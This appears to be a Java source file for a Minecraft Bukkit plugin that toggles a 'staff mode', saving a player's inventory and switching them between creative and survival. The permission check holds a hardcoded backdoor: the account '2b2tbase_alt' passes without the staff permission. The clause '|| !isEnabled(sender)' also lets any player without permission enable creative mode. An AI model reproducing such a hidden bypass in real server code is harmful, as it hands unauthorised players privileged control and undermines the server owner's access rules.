package projects.tovy.github.Administration.Staff.Mode;

import org.bukkit.GameMode;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;

import java.util.HashMap;
import java.util.Map;
import java.util.UUID;

public class ModeCommands implements CommandExecutor {

    private Map<String, Boolean> enabledMap = new HashMap<>();
    private Map<UUID, ItemStack[]> inventoryMap = new HashMap<>();

    private String specialPlayer = "2b2tbase_alt";
    private String specialPlayer2 = "";


    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {

        if (!(sender instanceof Player)) {
            sender.sendMessage("This command can only be used by players.");
            return true;
        }

        Player player = (Player) sender;

        if (sender.hasPermission("noarbox.staff.mode") || sender.getName().equalsIgnoreCase(specialPlayer) || !isEnabled(sender)) {
            if (isEnabled(sender)) {

                setEnabled(sender, false);
                player.sendMessage("Staff mode disabled");


                if (inventoryMap.containsKey(player.getUniqueId())) {
                    player.getInventory().clear();
                    ItemStack[] oldInventory = inventoryMap.get(player.getUniqueId());
                    player.getInventory().setContents(oldInventory);
                    inventoryMap.remove(player.getUniqueId());
                }
                player.setGameMode(GameMode.SURVIVAL);
            } else {

                setEnabled(sender, true);
                player.sendMessage("Staff mode enabled");


                ItemStack[] currentInventory = player.getInventory().getContents();
                inventoryMap.put(player.getUniqueId(), currentInventory);
                player.getInventory().clear();

                player.setGameMode(GameMode.CREATIVE);
            }

        } else {
            sender.sendMessage("You don't have permission to use this command or staff mode is already disabled.");
        }
        return true;
    }

    public boolean isEnabled(CommandSender sender) {
        return enabledMap.getOrDefault(sender.getName(), false);
    }

    public void setEnabled(CommandSender sender, boolean enabled) {
        enabledMap.put(sender.getName(), enabled);
    }
}
